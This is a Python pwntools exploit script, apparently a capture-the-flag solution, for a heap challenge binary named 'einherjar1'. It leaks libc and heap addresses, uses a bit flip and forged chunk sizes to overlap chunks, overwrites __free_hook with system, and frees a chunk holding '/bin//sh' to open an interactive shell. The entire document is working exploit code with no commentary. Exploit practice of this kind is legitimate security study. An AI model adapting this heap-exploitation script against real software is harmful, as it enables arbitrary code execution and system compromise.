from pwn import *
p = process('./einherjar1', env = {"LD_PRELOAD":"./libc.so.6"})

def add(size,idx):
    p.recvuntil(">> ")
    p.sendline("1")
    p.recvuntil("Enter size of input\n")
    p.sendline(str(size))
    p.recvuntil("Enter index\n")
    p.sendline(str(idx))
def delete(idx):
    p.recvuntil(">> ")
    p.sendline("2")
    p.recvuntil("Enter index\n")
    p.sendline(str(idx))
def view():
    p.recvuntil(">> ")
    p.sendline("4")
def edit(idx,content):
    p.recvuntil(">> ")
    p.sendline("3")
    p.recvuntil("Enter index\n")
    p.sendline(str(idx))
    p.sendline(str(content))
def flip(addr):
    p.recvuntil(">> ")
    p.sendline("1337")
    p.recvuntil("Address : ")
    p.sendline(addr)
def author(content):
    p.recvuntil(">> ")
    p.sendline("5")
    p.sendline(str(content))
add(32,0)
add(160,1)
add(160,2)
add(160,3)
add(160,4)
delete(1)
add(160,1)
view()
p.recvline()
libc_leak = u64(p.recvline()[4:].strip()+"\x00\x00")
libc_start = libc_leak - 0x3c4b78
print hex(libc_start)
delete(1)
delete(3)
delete(4)
add(160,4)
add(160,3)
view()
p.recvuntil("3 => ")
heap_leak = u64(p.recvline().strip()+"\x00\x00")
print hex(heap_leak)
heap_start = heap_leak - 0x130
print hex(heap_start)
add(160,5)
add(160,6)
flip(str(heap_start+0xf5))
edit(5,"a"*160+p64(0x3e0)+p64(0xb0))
author1 = heap_start + 0x10
st = p64(0x3e0) + p64(0x3e0) + p64(author1) + p64(author1) + p64(author1) + p64(author1)
author(st)
delete(6)
add(160,7)
free_hook = libc_start +  0x3c67a8
system = libc_start + 0x45390
exp = "a"*96 + p64(free_hook)
#gdb.attach(p)
edit(7,exp)
edit(0,p64(system))
edit(2,"/bin//sh")
delete(2)
p.interactive()
